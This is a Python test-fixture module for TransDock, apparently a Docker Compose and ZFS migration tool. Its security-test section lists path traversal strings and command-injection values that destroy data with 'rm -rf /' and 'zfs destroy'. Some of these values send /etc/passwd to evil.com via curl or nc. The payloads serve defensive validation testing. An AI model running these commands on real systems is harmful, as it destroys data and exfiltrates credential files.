"""
Test Data Fixtures for TransDock

This module provides sample data for testing TransDock functionality.
"""

from typing import Dict, Any, List

# Sample Docker Compose configurations
DOCKER_COMPOSE_AUTHELIA = {
    'version': '3.8',
    'services': {
        'authelia': {
            'image': 'authelia/authelia:latest',
            'container_name': 'authelia',
            'restart': 'unless-stopped',
            'ports': ['9091:9091'],
            'volumes': [
                './config:/config',
                './data:/data'
            ],
            'environment': {
                'TZ': 'America/New_York'
            }
        },
        'redis': {
            'image': 'redis:alpine',
            'container_name': 'authelia-redis',
            'restart': 'unless-stopped',
            'volumes': ['./redis:/data']
        },
        'mariadb': {
            'image': 'mariadb:10.5',
            'container_name': 'authelia-mariadb',
            'restart': 'unless-stopped',
            'environment': {
                'MYSQL_ROOT_PASSWORD': 'secret',
                'MYSQL_DATABASE': 'authelia',
                'MYSQL_USER': 'authelia',
                'MYSQL_PASSWORD': 'authelia_pass'
            },
            'volumes': ['./mariadb:/var/lib/mysql']
        }
    }
}

DOCKER_COMPOSE_SIMPLE = {
    'version': '3.8',
    'services': {
        'nginx': {
            'image': 'nginx:latest',
            'container_name': 'test-nginx',
            'ports': ['80:80'],
            'volumes': [
                './html:/usr/share/nginx/html',
                './nginx.conf:/etc/nginx/nginx.conf'
            ]
        }
    }
}

DOCKER_COMPOSE_COMPLEX = {
    'version': '3.8',
    'services': {
        'web': {
            'image': 'wordpress:latest',
            'container_name': 'wordpress',
            'restart': 'unless-stopped',
            'ports': ['8080:80'],
            'environment': {
                'WORDPRESS_DB_HOST': 'db:3306',
                'WORDPRESS_DB_USER': 'wordpress',
                'WORDPRESS_DB_PASSWORD': 'wordpress',
                'WORDPRESS_DB_NAME': 'wordpress'
            },
            'volumes': [
                './wordpress:/var/www/html',
                './uploads:/var/www/html/wp-content/uploads'
            ],
            'depends_on': ['db']
        },
        'db': {
            'image': 'mysql:8.0',
            'container_name': 'wordpress-db',
            'restart': 'unless-stopped',
            'environment': {
                'MYSQL_DATABASE': 'wordpress',
                'MYSQL_USER': 'wordpress',
                'MYSQL_PASSWORD': 'wordpress',
                'MYSQL_ROOT_PASSWORD': 'rootpassword'
            },
            'volumes': [
                './mysql:/var/lib/mysql'
            ]
        },
        'phpmyadmin': {
            'image': 'phpmyadmin/phpmyadmin',
            'container_name': 'phpmyadmin',
            'restart': 'unless-stopped',
            'ports': ['8181:80'],
            'environment': {
                'PMA_HOST': 'db',
                'PMA_PORT': '3306',
                'MYSQL_ROOT_PASSWORD': 'rootpassword'
            }
        }
    }
}

# Sample ZFS datasets and snapshots
ZFS_DATASETS = [
    'cache/compose',
    'cache/compose/authelia',
    'cache/compose/wordpress',
    'cache/appdata',
    'cache/appdata/authelia',
    'cache/appdata/wordpress',
    'cache/appdata/mariadb'
]

ZFS_SNAPSHOTS = [
    'cache/compose/authelia@migration-test-123',
    'cache/appdata/authelia@migration-test-123',
    'cache/appdata/mariadb@migration-test-123'
]

# Sample system information responses
SYSTEM_INFO_RESPONSE = {
    'hostname': 'test-unraid',
    'docker_version': '20.10.21',
    'zfs_available': True,
    'zfs_version': '2.1.5',
    'compose_base': '/mnt/cache/compose',
    'appdata_base': '/mnt/cache/appdata',
    'zfs_pool': 'cache'
}

SYSTEM_INFO_NO_ZFS = {
    'hostname': 'test-ubuntu',
    'docker_version': '20.10.21',
    'zfs_available': False,
    'zfs_version': None,
    'compose_base': '/home/user/compose',
    'appdata_base': '/home/user/appdata',
    'zfs_pool': None
}

# Sample migration requests
MIGRATION_REQUEST_AUTHELIA = {
    'compose_dataset': 'authelia',
    'target_host': '192.168.1.100',
    'target_base_path': '/home/user/docker',
    'ssh_user': 'root',
    'ssh_port': 22,
    'force_rsync': False
}

MIGRATION_REQUEST_FORCE_RSYNC = {
    'compose_dataset': 'wordpress',
    'target_host': '192.168.1.101',
    'target_base_path': '/opt/docker',
    'ssh_user': 'admin',
    'ssh_port': 2222,
    'force_rsync': True
}

# Sample migration statuses
MIGRATION_STATUS_RUNNING = {
    'id': 'migration-test-123',
    'status': 'running',
    'progress': 45,
    'message': 'Transferring data via ZFS send',
    'compose_dataset': 'authelia',
    'target_host': '192.168.1.100',
    'target_base_path': '/home/user/docker',
    'transfer_method': 'zfs_send',
    'snapshots': ['authelia@migration-test-123'],
    'volume_mapping': {
        '/mnt/cache/appdata/authelia': '/home/user/docker/authelia/data',
        '/mnt/cache/compose/authelia': '/home/user/docker/authelia'
    }
}

MIGRATION_STATUS_COMPLETED = {
    'id': 'migration-test-456',
    'status': 'completed',
    'progress': 100,
    'message': 'Migration completed successfully',
    'compose_dataset': 'wordpress',
    'target_host': '192.168.1.101',
    'target_base_path': '/opt/docker',
    'transfer_method': 'rsync',
    'snapshots': [],
    'volume_mapping': {
        '/mnt/cache/appdata/wordpress': '/opt/docker/wordpress/data',
        '/mnt/cache/compose/wordpress': '/opt/docker/wordpress'
    }
}

MIGRATION_STATUS_FAILED = {
    'id': 'migration-test-789',
    'status': 'failed',
    'progress': 25,
    'message': 'Transfer failed: SSH connection refused',
    'compose_dataset': 'nginx',
    'target_host': '192.168.1.102',
    'target_base_path': '/home/user/apps',
    'transfer_method': 'rsync',
    'error': 'SSH connection refused on port 22',
    'snapshots': []
}

# Test environment configurations
TEST_ENVIRONMENTS = {
    'unraid_source': {
        'hostname': 'unraid-server',
        'zfs_available': True,
        'zfs_pool': 'cache',
        'compose_base': '/mnt/cache/compose',
        'appdata_base': '/mnt/cache/appdata'
    },
    'ubuntu_target': {
        'hostname': 'ubuntu-server',
        'zfs_available': False,
        'compose_base': '/home/user/compose',
        'appdata_base': '/home/user/appdata'
    },
    'zfs_target': {
        'hostname': 'zfs-server', 
        'zfs_available': True,
        'zfs_pool': 'tank',
        'compose_base': '/tank/compose',
        'appdata_base': '/tank/appdata'
    }
}

# Security test payloads
SECURITY_TEST_PAYLOADS = {
    'path_traversal': [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        '\\windows\\system32\\config\\sam',
        '../etc/shadow',
        '..%2fetc%2fpasswd',
        '..%252fetc%252fpasswd',
        '..%c0%afetc%c0%afpasswd',
        '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '/var/www/../../etc/passwd'
    ],
    'command_injection': [
        '; rm -rf /',
        '&& rm -rf /',
        '|| rm -rf /',
        '| rm -rf /',
        '`rm -rf /`',
        '$(rm -rf /)',
        '; cat /etc/passwd',
        '&& cat /etc/passwd',
        '| cat /etc/passwd',
        '`cat /etc/passwd`',
        '$(cat /etc/passwd)',
        '; curl http://evil.com/steal?data=$(cat /etc/passwd)',
        '`curl http://evil.com/steal?data=$(cat /etc/passwd)`'
    ],
    'zfs_injection': [
        'pool/dataset; zfs destroy -r pool',
        'pool/dataset && zfs destroy -r pool',
        'pool/dataset | zfs destroy -r pool',
        'pool/dataset`zfs destroy -r pool`',
        'pool/dataset$(zfs destroy -r pool)',
        'pool/dataset; rm -rf /',
        'pool/dataset && rm -rf /',
        'pool/dataset`rm -rf /`',
        'pool/dataset$(rm -rf /)',
        'pool/dataset; zfs send pool/dataset | nc evil.com 1234'
    ],
    'ssh_injection': [
        'user; rm -rf /',
        'user && rm -rf /',
        'user | rm -rf /',
        'user`rm -rf /`',
        'user$(rm -rf /)',
        'user; cat /etc/passwd > /tmp/stolen',
        'user && cat /etc/passwd > /tmp/stolen',
        'user`cat /etc/passwd > /tmp/stolen`',
        'user$(cat /etc/passwd > /tmp/stolen)',
        'user; nc evil.com 1234 < /etc/passwd'
    ],
    'hostname_injection': [
        'host.com; rm -rf /',
        'host.com && rm -rf /',
        'host.com | rm -rf /',
        'host.com`rm -rf /`',
        'host.com$(rm -rf /)',
        'host.com; cat /etc/passwd',
        'host.com && cat /etc/passwd',
        'host.com`cat /etc/passwd`',
        'host.com$(cat /etc/passwd)',
        'host.com; curl http://evil.com/exfil?data=$(whoami)'
    ]
}

# Expected validation error messages
VALIDATION_ERROR_MESSAGES = {
    'path_traversal': 'Path contains directory traversal attempt',
    'empty_path': 'Path cannot be empty',
    'invalid_hostname': 'Invalid hostname format',
    'invalid_username': 'Invalid username format',
    'invalid_port': 'Port must be between 1 and 65535',
    'invalid_dataset': 'Invalid dataset name format',
    'command_injection': 'Security validation failed'
}

# Mock command outputs
MOCK_COMMAND_OUTPUTS = {
    'zfs_list': """NAME                    USED  AVAIL     REFER  MOUNTPOINT
cache                   1.2T   800G       96K  /mnt/cache
cache/compose           5.2G   800G       96K  /mnt/cache/compose
cache/compose/authelia  1.1G   800G      1.1G  /mnt/cache/compose/authelia
cache/appdata           45G    800G       96K  /mnt/cache/appdata
cache/appdata/authelia  2.3G   800G      2.3G  /mnt/cache/appdata/authelia""",
    
    'zfs_snapshot': """NAME                              USED  AVAIL     REFER  MOUNTPOINT
cache/compose/authelia@migration   24K      -      1.1G  -
cache/appdata/authelia@migration   48K      -      2.3G  -""",
    
    'docker_version': "Docker version 20.10.21, build baeda1f",
    
    'docker_compose_version': "docker-compose version 1.29.2, build 5becea4c",
    
    'ssh_test': "SSH connection successful",
    
    'rsync_test': """building file list ... done
./
file1.txt
file2.txt

sent 1,234 bytes  received 5,678 bytes  total size 9,012""",
    
    'zfs_send_test': """sending incremental stream
estimated size is 1.2G
1.2G sent in 45 seconds (27.3M/sec)"""
}

# API response templates
API_RESPONSES = {
    'health_check': {'status': 'healthy', 'timestamp': '2024-01-15T10:30:00Z'},
    'system_info': SYSTEM_INFO_RESPONSE,
    'zfs_status': {'available': True, 'version': '2.1.5', 'pools': ['cache']},
    'compose_stacks': {
        'stacks': [
            {'name': 'authelia', 'compose_file': '/mnt/cache/compose/authelia/docker-compose.yml'},
            {'name': 'wordpress', 'compose_file': '/mnt/cache/compose/wordpress/docker-compose.yml'},
            {'name': 'nginx', 'compose_file': '/mnt/cache/compose/nginx/docker-compose.yml'}
        ]
    },
    'migration_started': {
        'migration_id': 'migration-test-123',
        'status': 'started',
        'message': 'Migration initiated successfully'
    }
} 